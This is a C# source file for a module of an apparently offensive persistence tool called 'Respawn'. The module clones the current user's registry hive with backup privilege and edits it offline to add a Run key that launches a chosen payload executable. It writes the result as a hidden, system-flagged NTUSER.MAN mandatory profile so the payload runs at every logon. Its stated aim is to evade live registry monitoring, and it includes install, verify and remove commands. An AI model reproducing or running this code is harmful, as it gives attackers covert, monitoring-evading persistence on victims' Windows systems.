using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.MandatoryProfile
{
    public class MandatoryProfileModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "man";
        public string Name        => "Mandatory User Profile Hive";
        public string Mitre       => ""; 
        public string Description => "Persist by abusing the Windows Mandatory User Profile feature to drop a maliciously crafted `NTUSER.MAN` hive via offline registry manipulation. Because the hive is built offline and loaded natively by the OS at logon, it completely bypasses live registry monitoring APIs.";

        // ─── Constants ───────────────────────────────────────────────────────────

        private const string NtuserMan      = "NTUSER.MAN";
        private const string RunKeyPath     = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string RunValueName   = "Respawn_MandatoryProfile";
        private const string TempHiveName   = "hkcu_snapshot_tmp.dat";

        // ─── P/Invoke for Reboot Deletion ────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool MoveFileEx(string lpExistingFileName, string? lpNewFileName, uint dwFlags);

        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x04;

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            // 1. MINIMUM PRIVILEGE
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  MINIMUM PRIVILEGE:");
            Console.ResetColor();
            Console.WriteLine("    Administrator (Required to enable SeBackupPrivilege)\n");

            // 2. ACTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  ACTIONS:");
            Console.ResetColor();
            Console.WriteLine("    install, remove, verify, list-keys\n");

            // 3. OPTIONS
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Full path to the executable payload (.exe)");
            Console.WriteLine();

            // 4. EXAMPLES
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();
            TechniqueHelpBuilder.RenderExample("Respawn -t man -a install -p \"C:\\payload.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t man -a verify  -p \"C:\\payload.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t man -a remove");
        }

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return MandatoryProfileKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            string profileDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string ntuserManPath = Path.Combine(profileDir, NtuserMan);

            if (File.Exists(ntuserManPath))
                return TechniqueResult.Exists($"NTUSER.MAN already exists at '{ntuserManPath}'. Run 'remove' first.");

            string tempDir = Path.GetTempPath();
            string snapshotPath = Path.Combine(tempDir, TempHiveName);

            try
            {
                // 1. Enable SeBackupPrivilege to bypass Kernel Locks
                if (!TokenManipulator.EnablePrivilege("SeBackupPrivilege"))
                    return TechniqueResult.Denied("Failed to acquire SeBackupPrivilege. Are you running as Administrator?");

                Console.WriteLine("[*] SeBackupPrivilege acquired.");

                // 2. Snapshot the live HKCU hive securely to disk
                TryDelete(snapshotPath); 

                TechniqueResult snapshotResult = SnapshotLiveHive(snapshotPath);
                if (snapshotResult.Status != ResultStatus.Success)
                    return snapshotResult;

                Console.WriteLine("[*] Live registry hive successfully cloned.");

                // 3. Open the offline snapshot, inject payload, and save to profile directory
                TechniqueResult buildResult = BuildOfflineHive(snapshotPath, ctx.Payload, ntuserManPath);
                
                if (buildResult.Status != ResultStatus.Success)
                    return buildResult;

                // ─── OPSEC: Hide the mandatory profile from standard File Explorer views ───
                try
                {
                    File.SetAttributes(ntuserManPath, FileAttributes.Hidden | FileAttributes.System);
                    Console.WriteLine("[*] Applied 'Hidden' and 'System' attributes to NTUSER.MAN.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] OPSEC Warning: Failed to hide NTUSER.MAN: {ex.Message}");
                }
                // ───────────────────────────────────────────────────────────────────────────

                return TechniqueResult.Ok(
                    $"NTUSER.MAN installed at '{ntuserManPath}'.\n" +
                    $"[+] Perfect 1:1 OPSEC clone created. Payload injected.\n" +
                    "[!] Persistence will fire seamlessly on next user logon.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Unexpected error: {ex.Message}");
            }
            finally
            {
                TryDelete(snapshotPath);
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            string profileDir    = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string ntuserManPath = Path.Combine(profileDir, NtuserMan);

            if (!File.Exists(ntuserManPath))
                return TechniqueResult.NotFound($"NTUSER.MAN not found at '{ntuserManPath}'. Nothing to remove.");

            try
            {
                // Must remove read-only/system flags before deletion
                File.SetAttributes(ntuserManPath, FileAttributes.Normal);
                
                try
                {
                    // Try immediate deletion first
                    File.Delete(ntuserManPath);
                    return TechniqueResult.Ok("NTUSER.MAN removed immediately. Normal profile unlocked.");
                }
                catch (IOException)
                {
                    // File is locked by the OS (User is actively logged in). Schedule for reboot.
                    bool scheduled = MoveFileEx(ntuserManPath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                    
                    if (scheduled)
                        return TechniqueResult.Ok("NTUSER.MAN is currently locked by the OS. It has been scheduled for deletion on the next reboot.");
                    else
                        return TechniqueResult.Fail($"Failed to schedule deletion. Win32 Error: {Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Failed to process NTUSER.MAN removal: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            string profileDir    = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string ntuserManPath = Path.Combine(profileDir, NtuserMan);

            if (!File.Exists(ntuserManPath))
                return TechniqueResult.NotFound($"NTUSER.MAN not found at '{ntuserManPath}'.");

            try
            {
                nint hive = nint.Zero;
                uint status = OffregNative.OROpenHive(ntuserManPath, out hive);
                if (status != 0)
                    return TechniqueResult.Fail($"Failed to open offline hive (NTSTATUS 0x{status:X8}).");

                try
                {
                    nint hKey = nint.Zero;
                    status = OffregNative.OROpenKey(hive, RunKeyPath, out hKey);

                    if (status != 0)
                        return TechniqueResult.Fail($"Run key not found in offline hive.");

                    try
                    {
                        uint  dataType = 0;
                        uint  dataSize = 1024;
                        byte[] data     = new byte[dataSize];

                        status = OffregNative.ORGetValue(hKey, null, RunValueName, out dataType, data, ref dataSize);

                        if (status != 0)
                            return TechniqueResult.NotFound($"Run value '{RunValueName}' missing.");

                        string registeredPayload = Encoding.Unicode.GetString(data, 0, (int)dataSize).TrimEnd('\0');
                        
                        // Check attributes for verification
                        FileAttributes attributes = File.GetAttributes(ntuserManPath);
                        bool isHidden = (attributes & FileAttributes.Hidden) == FileAttributes.Hidden;
                        bool isSystem = (attributes & FileAttributes.System) == FileAttributes.System;
                        string opsecStatus = (isHidden && isSystem) ? "[Hidden/System OPSEC OK]" : "[OPSEC WARNING: Visible]";

                        return TechniqueResult.Ok($"Verified | NTUSER.MAN: present {opsecStatus} | Payload: '{registeredPayload}'");
                    }
                    finally { OffregNative.ORCloseKey(hKey); }
                }
                finally { OffregNative.ORCloseHive(hive); }
            }
            catch (DllNotFoundException)
            {
                return TechniqueResult.Ok($"NTUSER.MAN present. Offreg.dll not found — cannot inspect contents.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Verify error: {ex.Message}");
            }
        }

        // ═════════════════════════════════════════════════════════════════════════
        // Private Helpers
        // ═════════════════════════════════════════════════════════════════════════

        private static TechniqueResult SnapshotLiveHive(string outputPath)
        {
            nint hKey = nint.Zero;
            uint HKEY_CURRENT_USER = 0x80000001;
            uint KEY_READ = 0x20019;

            int openResult = RegistryNative.RegOpenKeyEx(new nint(HKEY_CURRENT_USER), null, 0, KEY_READ, out hKey);
            if (openResult != 0)
                return TechniqueResult.Fail($"Failed to open HKCU (Win32 Error: {openResult})");

            try
            {
                int saveResult = RegistryNative.RegSaveKeyW(hKey, outputPath, nint.Zero);
                
                if (saveResult == 1314) 
                    return TechniqueResult.Denied("RegSaveKey failed. SeBackupPrivilege was not held by the token.");
                
                if (saveResult != 0)
                    return TechniqueResult.Fail($"RegSaveKey failed (Win32 Error: {saveResult}). Ensure the temp file does not already exist.");

                return TechniqueResult.Ok("Snapshot successful.");
            }
            finally
            {
                RegistryNative.RegCloseKey(hKey);
            }
        }

        private static TechniqueResult BuildOfflineHive(string seedHivePath, string payloadPath, string outputPath)
        {
            nint hive = nint.Zero;
            uint status = OffregNative.OROpenHive(seedHivePath, out hive);
            if (status != 0)
                return TechniqueResult.Fail($"OROpenHive failed (NTSTATUS 0x{status:X8}). Ensure offreg.dll is present.");

            try
            {
                nint hRunKey = nint.Zero;
                uint disposition = 0;
                status = OffregNative.ORCreateKey(hive, RunKeyPath, null, 0, nint.Zero, out hRunKey, out disposition);

                if (status != 0)
                    return TechniqueResult.Fail($"ORCreateKey failed (NTSTATUS 0x{status:X8}).");

                try
                {
                    byte[] payloadBytes = Encoding.Unicode.GetBytes(payloadPath + "\0");
                    status = OffregNative.ORSetValue(hRunKey, RunValueName, OffregNative.REG_SZ, payloadBytes, (uint)payloadBytes.Length);

                    if (status != 0)
                        return TechniqueResult.Fail($"ORSetValue failed (NTSTATUS 0x{status:X8}).");
                }
                finally
                {
                    OffregNative.ORCloseKey(hRunKey);
                }

                TryDelete(outputPath);
                status = OffregNative.ORSaveHive(hive, outputPath, 6, 1); 
                if (status != 0)
                    return TechniqueResult.Fail($"ORSaveHive failed (NTSTATUS 0x{status:X8}).");

                return TechniqueResult.Ok("Offline hive built successfully.");
            }
            finally
            {
                OffregNative.ORCloseHive(hive);
            }
        }

        private static bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload))
            {
                error = "No payload specified. Use -p <full path to .exe>.";
                return false;
            }
            error = string.Empty;
            return true;
        }

        private static void TryDelete(string path)
        {
            try { if (File.Exists(path)) File.Delete(path); } catch { }
        }
    }

    // ═════════════════════════════════════════════════════════════════════════════
    // Native API Wrappers
    // ═════════════════════════════════════════════════════════════════════════════

    internal static class RegistryNative
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int RegOpenKeyEx(nint hKey, string? lpSubKey, uint ulOptions, uint samDesired, out nint phkResult);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern int RegSaveKeyW(nint hKey, string lpFile, nint lpSecurityAttributes);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern int RegCloseKey(nint hKey);
    }

    internal static class TokenManipulator
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool OpenProcessToken(nint ProcessHandle, uint DesiredAccess, out nint TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out LUID lpLuid);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges(nint TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, nint PreviousState, nint ReturnLength);

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID { public uint LowPart; public int HighPart; }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

        public static bool EnablePrivilege(string privilegeName)
        {
            uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
            uint TOKEN_QUERY = 0x0008;
            uint SE_PRIVILEGE_ENABLED = 0x00000002;

            if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out nint tokenHandle))
                return false;

            try
            {
                if (!LookupPrivilegeValue(null, privilegeName, out LUID luid))
                    return false;

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                };

                if (!AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, nint.Zero, nint.Zero))
                    return false;

                return Marshal.GetLastWin32Error() == 0; 
            }
            finally { }
        }
    }

    internal static class OffregNative
    {
        internal const uint REG_SZ = 1;
        private const string OffregDll = "offreg.dll";

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint OROpenHive([MarshalAs(UnmanagedType.LPWStr)] string hivePath, out nint phkResult);

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint ORCreateKey(nint hKey, [MarshalAs(UnmanagedType.LPWStr)] string lpSubKey, [MarshalAs(UnmanagedType.LPWStr)] string? lpClass, uint dwOptions, nint lpSecurityDescriptor, out nint phkResult, out uint lpdwDisposition);

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint OROpenKey(nint hKey, [MarshalAs(UnmanagedType.LPWStr)] string lpSubKey, out nint phkResult);

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint ORSetValue(nint hKey, [MarshalAs(UnmanagedType.LPWStr)] string lpValueName, uint dwType, [MarshalAs(UnmanagedType.LPArray)] byte[] lpData, uint cbData);

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint ORGetValue(nint hKey, [MarshalAs(UnmanagedType.LPWStr)] string? lpSubKey, [MarshalAs(UnmanagedType.LPWStr)] string lpValueName, out uint pdwType, [MarshalAs(UnmanagedType.LPArray)] byte[] pvData, ref uint pcbData);

        [DllImport(OffregDll, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern uint ORSaveHive(nint hKey, [MarshalAs(UnmanagedType.LPWStr)] string hivePath, uint dwOsMajorVersion, uint dwOsMinorVersion);

        [DllImport(OffregDll, SetLastError = false)]
        internal static extern uint ORCloseKey(nint hKey);

        [DllImport(OffregDll, SetLastError = false)]
        internal static extern uint ORCloseHive(nint hKey);
    }
}